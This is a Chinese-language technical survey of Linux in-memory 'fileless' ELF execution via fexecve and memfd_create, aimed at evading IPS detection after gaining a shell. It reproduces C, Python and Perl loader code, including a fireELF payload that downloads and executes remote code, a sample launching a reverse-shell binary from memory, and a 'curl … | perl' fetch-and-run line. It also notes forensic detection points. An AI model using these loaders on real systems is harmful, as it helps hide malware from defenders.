一般来说我们拿到Linux的shell后难免要上去进行各种各样的操作。无论是直接在命令行页面运行命令，亦或是通过种马实现控制，他们对资源的调用过程都极易被IPS类设备捕获到（历史记录、日志、hook），进而暴露了攻击。

web安全内有一种常见的webshell叫做无文件webshell,Windows下也有无文件攻击，那么Linux下是否有类似的具备一定隐蔽性的攻击手法呢。是有的，在网上我们也能找到一些被叫做“Linux无文件攻击”（实际是内存隐蔽加载ELF）的手法。这篇文章中，我们将好好讨论讨论这类手法的研究现状。

## 0x00 使用fexecve

fexecve 是glibc 2.10后引入的新函数是exec函数族的新成员，下面给出Linux man手册中对这一函数的讲解。

```text
//https://man7.org/linux/man-pages/man3/fexecve.3.html
DESCCRIPTION
       fexecve() performs the same task as execve(2), with the
       difference that the file to be executed is specified via a file
       descriptor, fd, rather than via a pathname.  The file descriptor
       fd must be opened read-only (O_RDONLY) or with the O_PATH flag
       and the caller must have permission to execute the file that it
       refers to.
       
NOTES
       On Linux with glibc versions 2.26 and earlier, fexecve() is
       implemented using the proc(5) filesystem, so /proc needs to be
       mounted and available at the time of the call.  Since glibc 2.27,
       if the underlying kernel supports the execveat(2) system call,
       then fexecve() is implemented using that system call, with the
       benefit that /proc does not need to be mounted.

       The idea behind fexecve() is to allow the caller to verify
       (checksum) the contents of an executable before executing it.
       Simply opening the file, checksumming the contents, and then
       doing an execve(2) would not suffice, since, between the two
       steps, the filename, or a directory prefix of the pathname, could
       have been exchanged (by, for example, modifying the target of a
       symbolic link).  fexecve() does not mitigate the problem that the
       contents of a file could be changed between the checksumming and
       the call to fexecve(); for that, the solution is to ensure that
       the permissions on the file prevent it from being modified by
       malicious users.

       The natural idiom when using fexecve() is to set the close-on-
       exec flag on fd, so that the file descriptor does not leak
       through to the program that is executed.  This approach is
       natural for two reasons.  First, it prevents file descriptors
       being consumed unnecessarily.  (The executed program normally has
       no need of a file descriptor that refers to the program itself.)
       Second, if fexecve() is used recursively, employing the close-on-
       exec flag prevents the file descriptor exhaustion that would
       result from the fact that each step in the recursion would cause
       one more file descriptor to be passed to the new program.  (But
       see BUGS.)

BUGS
       If fd refers to a script (i.e., it is an executable text file
       that names a script interpreter with a first line that begins
       with the characters #!)  and the close-on-exec flag has been set
       for fd, then fexecve() fails with the error ENOENT.  This error
       occurs because, by the time the script interpreter is executed,
       fd has already been closed because of the close-on-exec flag.
       Thus, the close-on-exec flag can't be set on fd if it refers to a
       script, leading to the problems described in NOTES.
```

简要的来说fexecve用于通过文件句柄执行可执行文件，这与exec函数族的其他函数通过参数来执行命令是不同的。如果我们写程序通过fexecve来执行其他程序就能达到在内存中临时行ELF的效果，这种方法在命令执行的场景下颇为冷门，与popen、system、execve函数显得更具隐蔽性。

当然，不是说使用这种方式运行ELF就完全无法进行发现与取证。fexecve最大的劣势也在于它使用句柄进行文件加载运行的，因此势必是依赖一个实体文件。当我们识别到恶意进程后，通过/proc目录分析就能定位到恶意文件，通过进程树分析也能发现执行fexecve操作的进程，因此这种方式虽然是通过内存加载ELF，但叫做无文件攻击显然是非常牵强的。

下面给出网上给出的一篇通过fexecve加载程序进行运行的例子。

### C语言版

#### 来源与参考

```shell
https://www.cnblogs.com/qiyeboy/p/12547204.html
```

#### 代码分析

示例代码利用挂载到文件系统中的共享内存分区执行文件，作者先将ping命令通过内存拷贝的方式拷贝至共享内存分区(/dev/shm)，这一目录下的东西是内存中的，并不实际放置于磁盘上，因此抗磁盘取证，之后fexecve函数调用文件句柄启动了ping命令。

```c
//gcc 1.c -lrt
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

static char *args[] = {
    "[ipv6_addrconf]",
	"192.168.44.1",
	NULL
};

extern char **environ;

int main(void) 
{
    struct stat st;
    void *p;
    int fd, shm_fd, rc;

    shm_fd = shm_open("pping", O_RDWR | O_CREAT, 0777);
    if (shm_fd == -1) {
	perror("shm_open");
	exit(1);
    }

    rc = stat("/usr/bin/ping", &st);
    if (rc == -1) {
	perror("stat");
	exit(1);
    }

    rc = ftruncate(shm_fd, st.st_size);
    if (rc == -1) {
	perror("ftruncate");
	exit(1);
    }

    p = mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_SHARED,
	     shm_fd, 0);
    if (p == MAP_FAILED) {
	perror("mmap");
	exit(1);
    }

    fd = open("/usr/bin/ping", O_RDONLY, 0);
    if (fd == -1) {
	perror("openls");
	exit(1);
    }
    //复制fd对应文件的内容到p空间中
    rc = read(fd, p, st.st_size);
    if (rc == -1) {
	perror("read");
	exit(1);
    }
    if (rc != st.st_size) {
	fputs("Strange situation!\n", stderr);
	exit(1);
    }

    munmap(p, st.st_size);
    close(shm_fd);
    //执行该命令，fexecve的用法是通过文件描述符运行文件
    shm_fd = shm_open("pping", O_RDONLY, 0);
    fexecve(shm_fd, args, environ);
    perror("fexecve");
    return 0;
}
```

### 优势与劣势

优势：由于/dev/shm下的内容是存在于内存中的，因此重启或磁盘备份取证都无法保留攻击样本。同时使用其他进程动态加载elf文件在日志及历史记录中也掩盖了运行恶意文件的操作。

劣势：通过审计/dev/shm下的内容差不多可以达到精准识别恶意文件及进程。只要当前系统未重启，哪怕执行恶意进程本身及其父进程都已经挂了，目录下文件依然存在。

## 0x01 使用memfd_create

下面给出Linux man手册中对这一函数的讲解。

```text
//https://man7.org/linux/man-pages/man2/memfd_create.2.html
DESCRIPTION
       memfd_create() creates an anonymous file and returns a file
       descriptor that refers to it.  The file behaves like a regular
       file, and so can be modified, truncated, memory-mapped, and so
       on.  However, unlike a regular file, it lives in RAM and has a
       volatile backing storage.  Once all references to the file are
       dropped, it is automatically released.  Anonymous memory is used
       for all backing pages of the file.  Therefore, files created by
       memfd_create() have the same semantics as other anonymous memory
       allocations such as those allocated using mmap(2) with the
       MAP_ANONYMOUS flag.

       The initial size of the file is set to 0.  Following the call,
       the file size should be set using ftruncate(2).  (Alternatively,
       the file may be populated by calls to write(2) or similar.)

       The name supplied in name is used as a filename and will be
       displayed as the target of the corresponding symbolic link in the
       directory /proc/self/fd/.  The displayed name is always prefixed
       with memfd: and serves only for debugging purposes.  Names do not
       affect the behavior of the file descriptor, and as such multiple
       files can have the same name without any side effects.
```

memfd_create()会创建一个匿名文件并返回一个指向这个文件的文件描述符。这个文件就像是一个普通文件一样，所以能够被修改，截断，内存映射等等。不同于一般文件，此文件是保存在RAM中。一旦所有指向这个文件的连接丢失，那么这个文件就会自动被释放。

攻击者可以通过这一函数创建恶意的匿名文件，实现隐蔽的无文件的内存加载elf攻击。

下面给出网上关于memfd_create()的几个经典的示例代码。

### C语言版-1

#### 来源与参考

代码是由@fbkcs最早在https://blog.fbkcs.ru/en/elf-in-memory-execution/ 网站上发表的。这篇文章知名度非常高。国内也有不少研究人员基于这篇文章进行分析与研究。

```shell
https://blog.fbkcs.ru/en/elf-in-memory-execution/
https://www.anquanke.com/post/id/168791
https://blog.csdn.net/Rong_Toa/article/details/109845832#t9
```

#### 代码分析

示例代码中使用SYS_memfd_create创建一个子进程，将其输出重定向至一个临时文件，等待子进程结束，从临时文件中读取子进程输出数据。通常情况下，*nix环境会使用|管道将一个程序的输出重定向至另一个程序的输入。

```shell
#include <stdio.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

int main()
{
    int fd;
    pid_t child;
    char buf[BUFSIZ] = "";
    ssize_t br;
// 通过syscall调用memfd_create创建匿名文件
    fd = syscall(SYS_memfd_create, "foofile", 0);
    if (fd == -1)
    {
        perror("memfd_create");
        exit(EXIT_FAILURE);
    }
// 通过fork函数确保后续子进程关闭后，再继续执行父进程的代码。
    child = fork();
    if (child == 0)
    {
    // dup2函数类似于Linux下的重定向‘>’，下面的代码中
    // 使用dup2是为了将原本通过execlp执行时输出在标准输出（被linux定义为句柄1）的内容重定向到匿名文件中，（即句柄fd内）
        dup2(fd, 1);
        close(fd);
        execlp("/bin/date", "/bin/date", NULL);
        perror("execlp date");
        exit(EXIT_FAILURE);
    }
    else if (child == -1)
    {
        perror("fork");
        exit(EXIT_FAILURE);
    }

    waitpid(child, NULL, 0);

    lseek(fd, 0, SEEK_SET);
    // 再将fd内获取到的执行输出重新拷贝出来
    br = read(fd, buf, BUFSIZ);
    if (br == -1)
    {
        perror("read");
        exit(EXIT_FAILURE);
    }
    buf[br] = 0;

    printf("child said: '%s'n", buf);

    exit(EXIT_SUCCESS);
}
```



### C语言版-2

#### 来源与参考

代码是由国内的安全厂商奇安信开源的一款工具，名叫ptrace，代码言简意赅基本上懂C的能直接看着猜出代码的意思，同样的网上也有不少分析。代码仓库地址如下:

https://github.com/QAX-A-Team/ptrace

#### 代码分析

```c
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <fcntl.h>
    #include <unistd.h>
    #include <linux/memfd.h>
    #include <sys/syscall.h>
    #include <errno.h>
     
    int anonyexec(const char *path, char *argv[])
    {
        int   fd, fdm, filesize;
        void *elfbuf;
        char  cmdline[256];
     
        //打开旧文件，记录其大小、内容
        fd = open(path, O_RDONLY);
        filesize = lseek(fd, SEEK_SET, SEEK_END);
        lseek(fd, SEEK_SET, SEEK_SET);
        elfbuf = malloc(filesize);
        read(fd, elfbuf, filesize);
        close(fd);
        
        // 创建匿名文件
        fdm = syscall(__NR_memfd_create, "elf", MFD_CLOEXEC);
        ftruncate(fdm, filesize);
        // 将旧文件内容拷贝至匿名文件，获得副本
        write(fdm, elfbuf, filesize);
        free(elfbuf);
        //对匿名文件的运行，这里使用通过execve直接执行本进程的/proc/self/fd/[匿名文件句柄]进行
        sprintf(cmdline, "/proc/self/fd/%d", fdm);
        argv[0] = cmdline;
        execve(argv[0], argv, NULL);
        free(elfbuf);
        return -1;
    }
     
    int main()
    {
        char *argv[] = {"/bin/uname", "-a", NULL};
        int result =anonyexec("/bin/uname", argv);
        return result;
    }

```

### python版本-1

#### 来源与参考

这里给出一段使用python脚本完成memfd_create调用的例子，代码来自fireELF项目，具体的代码地址为：

https://github.com/rek7/fireELF/blob/master/payloads/simple.py

同样的，网上已有不少现成的代码讲解与分析。

```shell
https://www.cnblogs.com/lsgxeva/p/12956858.html
https://blog.csdn.net/Rong_Toa/article/details/109845832#t9
```

#### 代码分析

```python
import base64
 
desc = {"name" : "memfd_create", "description" : "Payload using memfd_create", "archs" : "all", "python_vers" : ">2.5"}
 
def main(is_url, url_or_payload):
    payload = '''import ctypes, os, urllib2, base64
libc = ctypes.CDLL(None)
argv = ctypes.pointer((ctypes.c_char_p * 0)(*[]))
syscall = libc.syscall
fexecve = libc.fexecve'''
    if is_url:
        payload += '\ncontent = urllib2.urlopen("{}").read()'.format(url_or_payload)
    else:
        encoded_payload = base64.b64encode(url_or_payload).decode()
        payload += '\ncontent = base64.b64decode("{}")'.format(encoded_payload)
    payload += '''\nfd = syscall(319, "", 1)
os.write(fd, content)
fexecve(fd, argv, argv)'''
    return payload
```

我们再进一步从上面代码中提取出核心代码：

```python
import ctypes, os, urllib2, base64
libc = ctypes.CDLL(None)
argv = ctypes.pointer((ctypes.c_char_p * 0)(*[]))
syscall = libc.syscall
fexecve = libc.fexecve

content = PAYLOAD_2_EXECUTE
# memfd_create的函数调用码是319
fd = syscall(319, "", 1)
os.write(fd, content)
fexecve(fd, argv, argv)
```

可以从上面的代码中发现，作者的想法是先通过syscall调用memfd_create创建匿名文件，再把句柄交给fexecve去执行，代码还是很精辟犀利的。

### python版-2

#### 来源与参考

下面这段无名代码是从网上一篇安全分析文章中看到的，代码的基本思路是从

https://www.anquanke.com/post/id/168791

#### 代码分析

```python
import ctypes
import os
# 读入待执行文件的内容
binary = open('/tmp/rev-shell','rb').read()

# 创建匿名文件
fd = ctypes.CDLL(None).syscall(319,"",1)
# 完成将待执行文件内容写入到匿名文件的复制
final_fd = open('/proc/self/fd/'+str(fd),'wb') 
final_fd.write(binary)
final_fd.close()

fork1 = os.fork() #create a child
if 0 != fork1: os._exit(0)

# 通过syscall的方式调用setsid()函数，再执行fork，猜测目的是用来将匿名文件的进程挂载到其他进程下。
ctypes.CDLL(None).syscall(112)
fork2 = os.fork()
if 0 != fork2: os._exit(0)
# 正式运行起来恶意匿名文件
os.execl('/proc/self/fd/'+str(fd),'argv0','argv1')
```

### perl版

#### 来源与分析

perl版的代码最早来源于@magisterquis，国内不少关于这篇代码的分析都抄自”逢魔安全实验室“的分析。

https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html

实际上这份代码是目前最纯粹的无文件Linux攻击方案，代码非常之经典。

#### 代码分析

代码由三部分组成

**第一部分**

```shell
cat >> elfload.pl <<EOF
#!/usr/bin/env perl
use warnings;
use strict;

$l=1;
# Open a memory-backed file
print "Marking anonymous file...";
my $name = "";
my $fd = syscall(319,$name,1);
if (-1 == $fd) {
    die "memfd_create: $!";
}
print "fd $fd";

# Make a nice Perl file handle
open(my $FH, '>&='.$fd) or die "open: $!";
select((select($FH),$l=1)[0]);

# Load binary into anonymous file (i. e. into memory)
print "Writing ELF binary to memory...";
EOF
```



**第二部分**

```shell
perl -e '$/=\32;print"print \$FH pack q/H*/, q".(unpack"H*")."/\ or die qq/write: \$!/;\n"while(<>)' elfdemo >> elfload.pl
```



**第三部分**

```shell
cat >> elfload.pl <<EOF
print "done\n";

# Execute new program
print "Here we go...\n";
exec {"/proc/$$/fd/$fd"} "formsec"
        or die "exec: $!";
```

**利用**

```shell
curl 192.168.1.1/elfload.pl|perl
```

### 优势与劣势

优势：memfd_create提供了一种创建不落地的匿名文件的方案，这极大的增强了持久化过程的的隐身性。

劣势：memfd_create只是提供了一种匿名文件创建方法，需要和其他技术结合起来一起使用比如通过fexecve调用memfd_create创建的匿名文件句柄。





